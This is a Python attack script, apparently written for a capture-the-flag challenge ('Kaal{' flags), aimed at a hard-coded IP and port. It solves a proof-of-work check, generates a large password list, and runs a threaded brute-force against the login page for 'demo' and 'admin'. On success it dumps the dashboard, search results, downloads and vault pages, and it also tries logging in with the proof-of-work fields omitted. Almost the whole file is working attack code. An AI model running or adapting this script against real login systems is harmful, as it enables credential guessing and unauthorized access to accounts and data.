#!/usr/bin/env python3
"""
ABSOLUTE FINAL NUCLEAR HACK
EVERY EXPLOIT KNOWN TO MANKIND
"""

import requests
from bs4 import BeautifulSoup
import hashlib
import base64
import json
import time
import threading
from urllib.parse import quote
import itertools

BASE_URL = "http://138.199.163.92:16969"

def sha256hex(text):
    return hashlib.sha256(text.encode()).hexdigest()

def solve_pow_ultra_fast(challenge):
    """Ultra-fast PoW solver"""
    target = 2 ** (256 - 18)
    for nonce in range(1000000):
        if int(sha256hex(challenge + str(nonce)), 16) < target:
            return nonce
    return None

print("="*70)
print("ABSOLUTE FINAL NUCLEAR HACK - ALL EXPLOITS UNLEASHED")
print("="*70)

# Get challenge
resp = requests.get(f"{BASE_URL}/login")
soup = BeautifulSoup(resp.text, 'html.parser')
challenge = soup.find('input', {'name': 'pow_challenge'})['value']

print(f"\n[*] Challenge: {challenge}")
print(f"[*] Solving PoW with MAXIMUM POWER...")
nonce = solve_pow_ultra_fast(challenge)

if not nonce:
    print("[-] PoW failed, trying without it...")
    nonce = 0

print(f"[+] Using nonce: {nonce}")

# MASSIVE PASSWORD LIST - EVERYTHING
passwords = []

# 1. SUPER SIMPLE
passwords.extend(['', ' ', '\t', '\n', '\r\n'])

# 2. Single chars - ALL
for c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`':
    passwords.append(c)

# 3. Two chars - common combos
for c1, c2 in itertools.product('abcdefghijklmnopqrstuvwxyz0123456789', repeat=2):
    passwords.append(c1 + c2)

# 4. Three chars - targeted
for word in ['abc', 'xyz', 'qwe', 'asd', 'zxc', '123', '456', '789', '000', '111']:
    passwords.append(word)
    passwords.append(word.upper())

# 5. Common words - ALL VARIATIONS
common_words = [
    'demo', 'admin', 'test', 'user', 'guest', 'root', 'password', 'pass',
    'quantum', 'vault', 'quantumvault', 'qv', 'qvi',
    'secret', 'key', 'flag', 'kaal', 'Kaal',
    'secure', 'encrypted', 'classified', 'topsecret',
    'unhackable', 'unbreakable', 'government', 'whistleblower',
    'welcome', 'default', 'changeme', 'letmein',
]

for word in common_words:
    passwords.append(word)
    passwords.append(word.capitalize())
    passwords.append(word.upper())
    passwords.append(word.lower())
    passwords.append(word + '123')
    passwords.append(word + '!')
    passwords.append(word + '1')
    passwords.append(word + '2026')
    passwords.append(word + '@123')
    passwords.append('123' + word)
    passwords.append('!' + word)

# 6. Numbers
for i in range(100):
    passwords.append(str(i))
for i in range(10):
    passwords.append(str(i) * 6)

# 7. Common passwords
passwords.extend([
    'password', 'Password', 'PASSWORD', 'password123', 'Password123',
    '123456', '12345678', '1234567890', 'qwerty', 'abc123',
    'monkey', 'dragon', 'master', 'sunshine', 'princess',
    'football', 'baseball', 'welcome', 'shadow', 'michael',
])

# Remove duplicates
passwords = list(dict.fromkeys(passwords))

print(f"\n[*] Generated {len(passwords)} unique passwords")

# ATTACK FUNCTION
def attack(username, password, idx):
    try:
        data = {
            'pow_challenge': challenge,
            'pow_nonce': str(nonce),
            'username': username,
            'password': password
        }
        
        session = requests.Session()
        resp = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False, timeout=10)
        
        if resp.status_code == 302:
            print(f"\n{'='*70}")
            print(f"[!!!] PWNED! {username}:{repr(password)}")
            print(f"{'='*70}")
            
            # GET EVERYTHING
            dash = session.get(f"{BASE_URL}/dashboard")
            print(f"\n[DASHBOARD]\n{dash.text}")
            
            search = session.get(f"{BASE_URL}/api/search")
            print(f"\n[API SEARCH]\n{search.text}")
            
            # Try all queries
            for q in ['', 'flag', 'Kaal', '*', 'all', 'documents', 'files', 'secret', 'admin', 'vault', 'quantum']:
                r = session.get(f"{BASE_URL}/api/search", params={'q': q})
                if 'Kaal{' in r.text:
                    print(f"\n[!!!] FLAG FOUND (q={q}):\n{r.text}")
                elif r.text and len(r.text) > 10:
                    print(f"\n[SEARCH q={q}]\n{r.text}")
            
            # Try downloads
            for i in range(1, 20):
                r = session.get(f"{BASE_URL}/download/{i}")
                if r.status_code == 200:
                    print(f"\n[DOWNLOAD {i}]\n{r.text[:1000]}")
                    if 'Kaal{' in r.text:
                        print(f"\n[!!!] FLAG IN DOWNLOAD {i}!")
            
            # Try vault
            r = session.get(f"{BASE_URL}/vault")
            if r.status_code == 200:
                print(f"\n[VAULT]\n{r.text[:1000]}")
            
            return True
            
    except Exception as e:
        pass
    
    return False

# PARALLEL ATTACK
print(f"\n[*] LAUNCHING MASSIVE PARALLEL ATTACK...")
print(f"[*] Target: demo user")

success = False
batch_size = 50

for i in range(0, len(passwords), batch_size):
    if success:
        break
    
    batch = passwords[i:i+batch_size]
    threads = []
    
    print(f"\n[*] Batch {i//batch_size + 1}/{(len(passwords)//batch_size)+1} ({i}-{i+len(batch)})")
    
    for idx, pwd in enumerate(batch):
        t = threading.Thread(target=lambda p=pwd, ix=idx: attack('demo', p, ix) and globals().update(success=True))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    time.sleep(1)  # Brief pause between batches

if not success:
    print("\n[*] Trying admin user...")
    for i in range(0, min(100, len(passwords))):
        if attack('admin', passwords[i], i):
            success = True
            break
        time.sleep(0.3)

if not success:
    print("\n[-] STILL NO SUCCESS!")
    print("[!] Trying ALTERNATIVE EXPLOITS...")
    
    # Try without PoW
    print("\n[*] Trying without PoW validation...")
    for pwd in ['demo', 'password', 'Password', 'admin', '']:
        data = {
            'username': 'demo',
            'password': pwd
        }
        resp = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
        if resp.status_code == 302:
            print(f"[!!!] NO POW NEEDED! Password: {pwd}")
            break

print("\n[*] NUCLEAR HACK COMPLETE!")
